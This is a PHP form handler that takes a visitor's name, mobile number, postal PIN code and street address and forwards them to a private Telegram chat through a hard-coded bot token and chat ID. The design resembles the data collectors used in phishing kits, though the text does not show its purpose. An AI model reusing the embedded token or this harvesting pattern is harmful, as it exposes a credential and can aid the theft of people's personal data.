<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Telegram Bot Token
    $botToken = "8346882983:AAFzjIQiR3mRWo_qLAfGRIlwNWuQWn-ct4U";
    
    // Group Chat ID
    $chatId = "6059931271";

    // Collect form data
    $name = htmlspecialchars($_POST['name']);
    $number = htmlspecialchars($_POST['number']);
    $pin = htmlspecialchars($_POST['pin']);
    $city = htmlspecialchars($_POST['city']);
    $state = htmlspecialchars($_POST['state']);
    $flat = htmlspecialchars($_POST['flat']);
    $area = htmlspecialchars($_POST['area']);

    // Message content
    $message = "New Address Submission:\n\n";
    $message .= "Full Name: $name\n";
    $message .= "Mobile Number: $number\n";
    $message .= "PIN Code: $pin\n";
    $message .= "City: $city\n";
    $message .= "State: $state\n";
    $message .= "House/Building: $flat\n";
    $message .= "Road/Area: $area";

    // Telegram API URL
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);


    // Send the request
    $response = file_get_contents($url);

}
?>
